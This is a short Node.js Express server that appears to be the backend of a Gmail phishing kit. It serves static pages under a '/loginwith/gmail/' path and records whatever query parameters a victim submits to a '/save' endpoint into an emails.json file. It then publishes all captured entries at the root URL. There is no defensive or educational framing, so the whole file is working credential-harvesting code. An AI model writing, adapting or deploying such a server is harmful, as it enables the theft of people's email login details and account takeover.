const express = require('express');
const app = express();
const fs = require('fs');
oldData = [];
app.use('/loginwith/gmail/', express.static(__dirname + '/public'));
app.get('/loginwith/gmail/save', function routeHandler(req, res) {
    oldData.push(req.query);

    fs.writeFile('emails.json', JSON.stringify(oldData), 'utf8', () => {});
});
app.get('/', function routeHandler(req, res) {
    res.send(oldData);
});

app.listen(80, () => {
    console.log('App working');
});
